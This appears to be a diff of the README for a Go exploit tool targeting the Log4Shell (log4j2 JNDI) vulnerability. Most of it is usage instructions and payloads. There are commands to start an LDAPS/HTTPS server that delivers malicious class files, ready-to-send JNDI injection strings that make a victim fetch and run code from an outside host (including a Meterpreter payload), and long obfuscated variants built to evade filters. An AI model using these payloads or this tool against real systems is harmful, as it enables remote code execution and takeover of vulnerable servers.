@@ -1,5 +1,5 @@
 # Log4Shell
- * Check, exploit, obfuscate, TLS, ACME in one Go program. 
+ * Check, exploit, obfuscate, TLS, ACME in one Go program.
  * You don't need to install anything except develop it.
 
 ## Usage
@@ -10,41 +10,40 @@
  ### Start LDAPS and HTTPS server
    * ```Log4Shell.exe -host "example.com" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"```
    * ```Log4Shell.exe -host "1.1.1.1" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"``` (need IP SANs)
-   
+
  ### Start LDAPS and HTTPS server with ACME
    * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)
-   
+
  ### Obfuscate malicious(payload) string
    ```
-   Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/calc.class}"
-   
-   raw: ${jndi:ldap://1.1.1.1:3890/calc.class}
-   ${${lhnK:JFL3Nl:-j}n${Yx6-A3NuXSY1nI-g38C4MN-WAFx:-d}i:${2O:bO2I5l:-l}${yeZ6-mnrv6pb:gB49n:XrYMP:-d}
-   ${jVBMSs-iOFWslRG-XuNO:dsCO:-a}${jYYNn:Twh80-IYXK:-p:/}${eOFbh:DW35u2:-/1.}${EkFw3Z-YsM9CIMV8:g2DHZ:
-   -1}${Vez8Sb:Mwn:-}${yWH0V-FY9jJQZ2:TOSkrotU:oq1i:-}${kZ:BoJpOxRH-yFI2POt-88w2:-.1}${xbswX-VstKzXnyNz
-   i8:jeEQKB5WRH-Ob:-}${Uyhe0-aYuAh-MdR63to:GONgfM:-.}${eA:eCPgpV-NWF7s:-}${mrLla-owJSvkD:n0cmdQ-V2cLx:
-   -1:3}${CwG9:Hc:-}${xT:aiD7ho:xz:-8}90${NTSL-dSfw9NC:7OiGEp:gMQwko:-}/${TCpW:UhZI0IO8:9Jz5MH:WyM:-c}$
-   {Mlv:AS8TOFMM-b9I2:FqvBY:-al}${mfGW:EY1Yd48:E0KhRGfp:5CBsuC:-c}${xDw1-ZyHav9K:jPHo18i:zibmI:-.}c${ye
-   -kZjRa5g61cm-Hn2yR7:-la}${Htg:cySA:-s}s}
+   Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"
+
+   raw: ${jndi:ldap://1.1.1.1:3890/Calc}
+
+   ${jn${Nc3-h17cwiZ-bRU2sh:-di:}${CGPuF-OGZxNU-zZfWp:-l}${wW:sVK9ZUijf:jUelV4upFr:wjD:-}d${OZQ-MqOEGT9K
+   -IAdC:-ap}${Kce64-15l39K4DD5-xWtee:zY:-:/}${gZm-yFU0:-}${o05ov5-9bU2WWgtlf:PK5:-/}${y7sa1T:aFd6Q7S45r
+   -KYGD:-}${0dPYxy:IqCd:-1}${YSf-yHfZ:-.1}${Jct1X-kQVdPM:cKmXcaheDfY:kI:-}.${It:CK52YEP-6HC:-1.1}${rzgS
+   :e1wOc5zHLe-Q1tI2IqBj-G2A:-}:3${NMDyH8-bsqLVD-m0HdT:ik:-}${Bg-2GX6XW:CFHnf:-}${4sqv:HPwwv:-89}0${BzHb
+   q-JBkQtJ7qDz:L7PaQXH:PUYv91:-/C}${QfhcM:tn:-}${6e-OkiFFt:WtnF:-al}c${etTbi-iWYq-pvATIA6K2K:Rq:-}}
    ```
-   
+
 ## Check
  * start Log4Shell server
  * put your class file to the payload directory
- * send ```${jndi:ldap://1.1.1.1:3890/nop.class}```
- * send ```${jndi:ldaps://example.com:3890/nop.class}``` with TLS
+ * send ```${jndi:ldap://1.1.1.1:3890/Nop}```
+ * send ```${jndi:ldaps://example.com:3890/Nop}``` with TLS
 
 ## Exploit
  * start Log4Shell server
  * put your class file to the payload directory
- * send ```${jndi:ldap://1.1.1.1:3890/meterpreter.class}```
- * send ```${jndi:ldaps://example.com:3890/meterpreter.class}``` with TLS
+ * send ```${jndi:ldap://1.1.1.1:3890/Meterpreter}```
+ * send ```${jndi:ldaps://example.com:3890/Meterpreter}``` with TLS
  * meterpreter will open source after some time
 
 ## VulApp
  * VulApp is a vulnerable Java program that use log4j2 package.
  * You can use it for develop this project easily.
- * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/calc.class}```
+ * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/Calc}```
 
 ## Help
   ```
